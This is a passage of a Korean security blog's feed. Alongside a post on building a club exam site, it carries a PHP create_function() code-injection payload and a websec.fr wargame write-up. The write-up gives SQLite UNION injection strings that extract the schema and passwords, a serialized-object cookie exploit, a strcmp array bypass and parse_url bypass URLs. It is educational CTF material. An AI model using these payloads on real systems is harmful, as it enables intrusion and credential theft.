        <content type="html"><![CDATA[<h3 id="간단-계기"><a href="#간단-계기" class="headerlink" title="간단, 계기"></a>간단, 계기</h3><p>요즘 코로나19 영향 때문에 학교는 물론 동아리 운영도 쉽지 않다.</p><p>이번 동아리 신입생 선발 시험에 관련해서 임원진들과 몇가지 생각해본 것이 있는데</p><p>오프라인으로 진행하기에는 사실 장소 대여도 쉽지 않아서 여러 방안을 생각해보다가</p><p>온라인으로 시험을 진행하기로 했는데 이 방법 역시 쉬운 방법만은 아니였다.</p><p>이유는 시험에 대한 감독을 진행할 수 없다는 점(부정 행위)에 대한 문제점이 가장 크게 작용하였는데,</p><p>제출 확인을 할 때 출제자 들이 조금 더 엄격하게 체크해야 하는 쪽이 제일 최선의 방법인 것 같았다.</p><p>또한 C/Python 마다 속해있는 인원이 달라 문제 배포에 대해서도 문제점이 있었는데,</p><p>이 부분은 내가 웹 개발을 해주겠다고 해서 문제가 일단 해결되었다.</p><hr><h3 id="개발-과정"><a href="#개발-과정" class="headerlink" title="개발 과정"></a>개발 과정</h3><p>시험은 오는 6월 18일에 진행을 예정하고 있다. 사실 BoB 준비도 그렇고 다른 일때문에 바쁘다 보니</p><p>5월 말이나 되서야 개발을 시작하게 되었는데 오늘 날짜로 한 2주 살짝 넘게 작업을 했었고,</p><p>교내 동아리 서버를 이용해서 도커로 웹 서버를 구축하고 기능을 하나씩 만들어 갔던 기억이 있다.</p><p>사실 단순하게 운영에 꼭 필요한 기능들만 생각하고 개발을 했는데 시큐어 코딩을 계속 적용해야 하다보니 생각해야할 부분이 많았다.</p><p>또한, 개발하면서 임원진들이 개선 요청이 자주 있었을뿐더러 테스트를 할 때 예상과 다르게 작동되는 기능이 몇가지 있어서 계속 수정 하면서 릴리즈 했던 기억이 있다..</p><hr><h3 id="주요-기능"><a href="#주요-기능" class="headerlink" title="주요 기능"></a>주요 기능</h3><ul><li>로그인</li><li>회원가입</li><li>코드 컴파일러</li><li>시험 문제 풀이</li><li>제출</li></ul><p>[로그인] &amp; [회원가입] : 신입생(회원) 여부를 체크하기 위한 목적</p><p>[코드컴파일러] : 문제를 보고 자신이 작성한 코드가 정상적으로 작동되는지를 보기 위한 컴파일러이다. (Sphere Engine API)</p><p>[시험문제] : 회원가입 때 본인이 응시하겠다고 하는 분야를 바탕으로 (공통 분야/선택한 분야) 를 포함하여 문제가 공개된다.</p><p>[제출] : 제출할 때 편의성(?) 을 조금 더 높히고자 파일을 업로드 받아 메일 서버를 통해서 동아리 관리 계정으로 이메일이 발송되도록 구현 했다.</p><hr><h3 id="개인적인-생각"><a href="#개인적인-생각" class="headerlink" title="개인적인 생각"></a>개인적인 생각</h3><p>혼자서 웹 하나를 구축해 나가면서 생각지도 못한 부분에서 취약점도 있었고, 로직 버그도 1~2개씩 있었던 것 같다.</p><p>그리고 대부분 DB 서버로 연동해서 자동화 처리를 수행했는데 시험 페이지쪽에 시간을 설정하는 쪽에는 아직 수동으로 구축되어 있다.</p><p>이 부분은 아마 이번 주말내에 관리 모듈에서 연동할 수 있도록 해서 추가할 예정중에 있다.</p><p>그리고 기능에 대해서도 자체적으로 구현하면 좋을 수 있는 것들이 많았지만 시간적인 문제도 있었기에 모든 부분을 다 구현하지는 못했다.</p><p>하나의 웹을 만들어 나가면서 부족한 점도 많이 느낄 수 있었던 부분인 것 같다.</p><h3 id="오픈-소스"><a href="#오픈-소스" class="headerlink" title="오픈 소스"></a>오픈 소스</h3><p><a href="https://github.com/JHye0n/bangsiri_online_exam">https://github.com/JHye0n/bangsiri_online_exam</a></p>]]></content>
      
      
      <categories>
          
          <category> Memo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Development </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>워게임 사이트 추천</title>
      <link href="2020/06/03/wargame-list-200603/"/>
      <url>2020/06/03/wargame-list-200603/</url>
      
        <content type="html"><![CDATA[<p>해당 자료는 아래 노션에 작성되어 있습니다.</p><p><a href="https://www.notion.so/jhyeon/43ce112d299d42e0be73e5da5d9be39a">https://www.notion.so/jhyeon/43ce112d299d42e0be73e5da5d9be39a</a></p>]]></content>
      
      
      <categories>
          
          <category> Memo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wargame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Browser Auditor 기술 발표 자료</title>
      <link href="2020/05/26/browser-auditor-200526/"/>
      <url>2020/05/26/browser-auditor-200526/</url>
      
        <content type="html"><![CDATA[<h3 id="발표자료"><a href="#발표자료" class="headerlink" title="발표자료"></a>발표자료</h3><p>2019년 11월에 있었던 KUCIS 서경강권역 학술 세미나에서 발표 자료로 썼던 내용 입니다.</p><p>자료 다운로드 : <a href="https://drive.google.com/open?id=1mWcSwYwmdUHYZDLgb7szeHc7gbczpcpc">https://drive.google.com/open?id=1mWcSwYwmdUHYZDLgb7szeHc7gbczpcpc</a></p>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Browser Auditor </tag>
            
            <tag> XSS </tag>
            
            <tag> CSRF </tag>
            
            <tag> Chrome </tag>
            
            <tag> Firefox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>문서형 악성코드 분석 발표 자료(Malware Analyze)</title>
      <link href="2020/05/26/malware-analyze-200526/"/>
      <url>2020/05/26/malware-analyze-200526/</url>
      
        <content type="html"><![CDATA[<h3 id="발표자료"><a href="#발표자료" class="headerlink" title="발표자료"></a>발표자료</h3><p>2019년 8월에 있었던 KUCIS 영남권역 학술 세미나에서 발표 자료로 썼던 내용 입니다.</p><p>악성코드 개념, 종류, 사례 그리고 실제 악성코드 분석 결과 등에 대한 내용을 작성 하였습니다.</p><p>자료 다운로드 : <a href="https://drive.google.com/open?id=1gVxnWzPI8sX9k5yI-gG5L31Mx9wUKm68">https://drive.google.com/open?id=1gVxnWzPI8sX9k5yI-gG5L31Mx9wUKm68</a></p>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Malware </tag>
            
            <tag> Macro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>create_function() RCE 취약점 정리</title>
      <link href="2020/05/15/function-rce-200515/"/>
      <url>2020/05/15/function-rce-200515/</url>
      
        <content type="html"><![CDATA[<h3 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h3><p>create_function 함수는, php.net(<a href="https://www.php.net/manual/en/function.create-function.php">https://www.php.net/manual/en/function.create-function.php</a>) 에</p><p>정의된 내용으로, 매개변수를 전달받아 익명 함수를 생성하는 함수 입니다.</p><hr><h3 id="함수-정의"><a href="#함수-정의" class="headerlink" title="함수 정의"></a>함수 정의</h3><p>해당 함수는 아래와 같이 사용할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure><hr><h3 id="함수-취약점-분석"><a href="#함수-취약점-분석" class="headerlink" title="함수 취약점 분석"></a>함수 취약점 분석</h3><p>하지만, 함수를 잘못된 방법으로 사용할 시 RCE 취약점이 발생하게 되는데 예시는 다음과 같습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 사용할 시에 두번째 인자에 임의적인 값을 주입하여 원하는 코드를 실행시킬 수 있습니다.</p><p><code> return -1;&#125; phpinfo(); /* </code></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>websec.fr babysteps Write up</title>
      <link href="2020/05/14/websecbaby-200514/"/>
      <url>2020/05/14/websecbaby-200514/</url>
      
        <content type="html"><![CDATA[<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LevelOne</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doQuery</span>(<span class="params"><span class="variable">$injection</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$pdo</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . <span class="variable">$injection</span> . <span class="string">&#x27; LIMIT 1&#x27;</span>;</span><br><span class="line">        <span class="variable">$getUsers</span> = <span class="variable">$pdo</span>-&gt;query(<span class="variable">$query</span>);</span><br><span class="line">        <span class="variable">$users</span> = <span class="variable">$getUsers</span>-&gt;fetchArray(SQLITE3_ASSOC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$users</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$users</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>문제 풀이의 핵심적인 부분만 추려내서 보자.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query <span class="operator">=</span> <span class="string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . $injection . <span class="string">&#x27; LIMIT 1&#x27;</span>;</span><br></pre></td></tr></table></figure><p>일단 쿼리문의 형태는 다음과 같다, $injection 이 부분에 입력하는 데이터가 들어가게 된다.</p><p>예를 들면 1을 입력했을 때 where id=1 limit 1과 같은 구조를 가질 것 이다.</p><p>먼저 해당 문제는 sqlite3 를 사용하는 문제이기 때문에 테이블의 구조를 union 연산자로 뽑아보자.</p><p>table structure –&gt; 1 union select 1, sql from sqlite_master– -</p><p>그러면 아래와 같이 결과를 출력해줄 것 이다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">-</span><span class="operator">&gt;</span> <span class="number">1</span></span><br><span class="line">username <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users(id <span class="type">int</span>(<span class="number">7</span>), username <span class="type">varchar</span>(<span class="number">255</span>), password <span class="type">varchar</span>(<span class="number">255</span>))</span><br></pre></td></tr></table></figure><p>테이블 명, 컬럼 구조를 알았으니 그냥 이제 데이터 빼내오면 된다.</p><p>password –&gt; 1 union select 1, password from users where id=1– -</p><hr><h3 id="2-LEVEL-4"><a href="#2-LEVEL-4" class="headerlink" title="2. LEVEL-4"></a>2. LEVEL-4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;leet_hax0r&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$sess_data</span> = unserialize (base64_decode (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;leet_hax0r&#x27;</span>]));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$sess_data</span>) &amp;&amp; <span class="variable">$sess_data</span>[<span class="string">&#x27;ip&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;CANT HACK US!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$e</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$cookie</span> = base64_encode (serialize (<span class="keyword">array</span> ( <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]))) ;</span><br><span class="line">    setcookie (<span class="string">&#x27;leet_hax0r&#x27;</span>, <span class="variable">$cookie</span>, time () + (<span class="number">86400</span> * <span class="number">30</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; is_numeric (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$sql</span>-&gt;query .= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27; Invalid query&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$query</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> SQLite3 (<span class="string">&quot;database.db&quot;</span>, SQLITE3_OPEN_READONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SQL_query</span>(<span class="params"><span class="variable">$query</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;conn-&gt;query (<span class="keyword">$this</span>-&gt;query);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="keyword">$this</span>-&gt;conn)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connect ();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;execute ();</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$ret</span>) &#123;    </span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">false</span> !== (<span class="variable">$row</span> = <span class="variable">$ret</span>-&gt;fetchArray (SQLITE3_ASSOC))) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;p class=&quot;well&quot;&gt;&lt;strong&gt;Username:&lt;strong&gt; &#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>해당 문제는 PHP Object Injection(Serialize) 문제 이다.</p><p>코드의 실행 흐름을 보면 leet_hax0r 라는 쿠키가 존재하면, $sess_data 변수에 쿠키값을 unserialize 해주고 값을 담는다.</p><p>결론은 SQL 쿼리문을 serialize -&gt; base64_encode 한 다음 쿠키 값을 바꿔주면 원하는 쿼리문을 실행시킬 수가 있다.</p><p>문제와 조건을 맞춰서 seralize화 코드를 짜서 풀었는데 아래와 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$query</span> = <span class="string">&#x27;query&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="keyword">new</span> SQL;</span><br><span class="line"><span class="variable">$result</span> = serialize(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$encode</span> = base64_encode(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encode</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>table structure –&gt; select id, username from users where id=1 union select 1, sql from sqlite_master– -</p><p>password –&gt; select password as username from users where id=1– -</p><hr><h3 id="3-LEVEL-17"><a href="#3-LEVEL-17" class="headerlink" title="3. LEVEL-17"></a>3. LEVEL-17</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep_rand</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* I wish php5 had random_int() */</span></span><br><span class="line">        <span class="variable">$range</span> = <span class="number">100000</span>;</span><br><span class="line">        <span class="variable">$bytes</span> = (<span class="keyword">int</span>) (log(<span class="variable">$range</span>, <span class="number">2</span>) / <span class="number">8</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;  <span class="comment">/* Side effect: more random cpu cycles wasted ;) */</span></span><br><span class="line">            <span class="variable">$rnd</span> = hexdec(bin2hex(openssl_random_pseudo_bytes(<span class="variable">$bytes</span>)));</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="variable">$rnd</span> &gt;= <span class="variable">$range</span>);</span><br><span class="line">        usleep(<span class="variable">$rnd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (! strcasecmp (<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>], <span class="variable">$flag</span>))</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#x27;</span> . <span class="variable">$flag</span> . <span class="string">&#x27;&lt;/mark&gt;.&lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>조건문만 보고 바로 strcmp 취약점이라는 것을 알 수 있었다.</p><p>php loose comparison 라고도 부르는데, 참고 자료는 아래를 확인하자.</p><p>즉 $_POST[‘flag’] 부분을 배열로 넘겨주면 된다.</p><p>flag[]=hi</p><ul><li><p>참고(http request online) : <a href="https://reqbin.com/">https://reqbin.com/</a></p></li><li><p>참고(php loose comparison) : <a href="https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison">https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison</a></p></li></ul><hr><h3 id="4-LEVEL-25"><a href="#4-LEVEL-25" class="headerlink" title="4. LEVEL-25"></a>4. LEVEL-25</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>])[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (stripos(<span class="variable">$v</span>, <span class="string">&#x27;flag&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;You are not allowed to get the flag, sorry :/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>parse_url 함수에서 발생하는 버그(좋버그?) 같은 개념의 문제이다..</p><p>간단히 요약만 하면 주소에서 //를 사용하면 http://와 같은 개념이다.</p><p>그런데 /// 를 쓰면 이 함수에서는 정상적인 호스트 값이 아님을 인식하여 false를 반환시킬 수 있다.</p><p><a href="http://websec.fr///level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C">http://websec.fr///level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C</a></p><p>이외에도 포트를 사용한 방법, 비정상 페이로드를 입력하여 오류를 발생 시킬수도 있다.</p><ul><li><p>기타 방법 : <a href="http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C:80">http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C:80</a></p></li><li><p>기타 방법2 : <a href="http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C&amp;test=1:1">http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C&amp;test=1:1</a></p></li></ul><hr><h3 id="5-LEVEL-28"><a href="#5-LEVEL-28" class="headerlink" title="5. LEVEL-28"></a>5. LEVEL-28</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;flag_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">4096</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Your file is too heavy.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$filename</span> = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$fp</span> = fopen(<span class="variable">$_FILES</span>[<span class="string">&#x27;flag_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  <span class="variable">$flagfilecontent</span> = fread(<span class="variable">$fp</span>, filesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;flag_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]));</span><br><span class="line">  @fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$flagfilecontent</span>);</span><br><span class="line">  <span class="keyword">if</span> (md5_file(<span class="variable">$filename</span>) === md5_file(<span class="string">&#x27;flag.php&#x27;</span>) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;checksum&#x27;</span>] == crc32(<span class="variable">$_POST</span>[<span class="string">&#x27;checksum&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);  <span class="comment">// it contains the `$flag` variable</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&quot;Nope, <span class="subst">$filename</span> is not the right file, sorry.&quot;</span>;</span><br><span class="line">        sleep(<span class="number">1</span>);  <span class="comment">// Deter bruteforce</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  unlink(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>음 여러가지로 고민을 좀 했던 문제이다.</p><p>md5, crc32를 조건을 우회해서 접근할까? 라는 생각을 잠깐 해봤었던 나는 정상이 아닌 것 같다.</p><p>암튼 본론으로 가면 해당 문제는 레이스 컨디션(race condition) 기법으로 풀이 하였다.</p><p>파일을 업로드 하고, unlink 하기전 sleep(1) 라는 1초 시간이 있어 이 기법을 활용해 서로 다른 브라우저에서 동시에 요청을 하면,</p><p>충분히 레이스 컨디션으로 서버가 unlink 하기전에 파일을 읽어올 수 있을 것 이라고 생각 하였다.</p><ul><li>코드 풀이 추가 예정</li></ul>]]></content>
      
      
      <categories>
          
          <category> Wargame </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> websec.fr </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>websec.fr easy Write up</title>
      <link href="2020/05/14/webseceasy-200514/"/>
      <url>2020/05/14/webseceasy-200514/</url>
      
